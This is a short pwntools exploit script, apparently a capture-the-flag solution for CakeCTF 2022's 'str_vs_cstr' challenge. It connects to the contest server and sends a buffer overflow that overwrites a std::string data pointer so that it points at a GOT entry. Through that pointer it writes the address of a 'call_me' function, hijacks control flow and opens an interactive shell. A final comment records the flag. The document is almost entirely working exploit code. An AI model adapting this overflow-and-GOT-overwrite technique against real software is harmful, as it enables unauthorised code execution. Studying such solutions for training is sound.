from pwn import *

context.terminal = ['tmux', '-split-w', '-h']

binpath = 'str_vs_cstr/chall'
elf = ELF(binpath)

# io = process(binpath)
io = remote('pwn1.2022.cakectf.com', 9003)
io.recvuntil(b'4. get str\n')

payload = b'A' * 0x20
# [0x404040] _ZStlsIcSt11char_trait@GLIBCXX_3.4.21  →  0x401080
payload += p64(0x404048)
payload += p64(8)
io.sendlineafter(b'choice: ', b'1')
io.sendlineafter(b'c_str: ', payload)

# raw_input()

addr_call_me = 0x4016de
payload = p64(addr_call_me)
io.sendlineafter(b'choice: ', b'3')
io.sendlineafter(b'str: ', payload)

# CakeCTF{HW1: Remove "call_me" and solve it / HW2: Set PIE+RELRO and solve it}


io.interactive()
